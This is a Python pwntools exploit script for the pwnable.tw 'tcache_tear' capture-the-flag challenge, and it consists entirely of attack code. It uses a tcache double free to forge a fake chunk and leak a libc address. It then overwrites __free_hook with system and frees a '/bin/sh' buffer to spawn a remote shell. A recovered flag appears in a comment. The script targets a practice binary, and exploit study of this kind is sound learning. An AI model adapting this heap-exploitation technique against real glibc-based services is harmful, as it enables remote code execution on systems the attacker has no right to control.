from pwn import *

#p = process(["./ld-2.27.so","./tcache_tear"],env={"LD_PRELOAD":"./libc-2.27.so"})
p = remote("chall.pwnable.tw",10207)
#p = process(["./ld-2.27.so","./tcache_tear"],env={"LD_PRELOAD":"./libc.so"})

elf = ELF("./tcache_tear")
libc = ELF("./libc.so")

def create(size,data):
	p.sendlineafter("choice :","1")
	p.sendlineafter("Size:",str(size))
	p.sendafter("Data:",data)


def delete():
	p.sendlineafter("choice :","2")


p.sendlineafter("Name",p64(0) + p64(0x511))

create(9,"aa")
delete()

create(0x20,"bb")
delete()

create(9,"A"*24 + p64(0xa0))

create(0x20,"CC")
delete()

create(0x9,"C")
delete()

create(0x90,"A"*0x20 + p64(0) + p64(0x21) + p64(0x0602060))

create(0x9,"B"*8)
create(0x9,"A"*8 + p64(0x511) + "B"*24 + p64(0x0602070) + "A"*(0x510-0x30) + p64(0x510) + p64(0x51) + "A"*0x48 + p64(0x51))

delete()

p.sendlineafter("choice :","3")

p.recvuntil(p64(0x511))

leak = u64(p.recvuntil('\x7f').ljust(8,'\x00'))
libc_base = leak - 0x3ebca0
malloc_hook = libc_base + libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
oneshot = libc_base + 0x4f322#0x10a38c#0x4f322#0x4f2c5
system = libc_base + libc.sym['system']

print "[+] leak : " + hex(leak)
print "[+] libc_base : " + hex(libc_base) 
print "[+] using onshot : " + hex(oneshot)


create(0x30,"A"*24 + p64(0))
create(0x9,"A"*8)
delete()
create(0x50,"B")
delete()

create(9,"C"*0x18 + p64(0x61) + p64(free_hook-8))
create(0x50,"A"*8)
create(0x50,"/bin/sh\x00" + p64(system))
#gdb.attach(p)
delete()

#p.sendlineafter("Done","1")
#p.sendlineafter("Size","0")

#gdb.attach(p)


#p.sendline("3")


#FLAG{tc4ch3_1s_34sy_f0r_y0u}

p.interactive()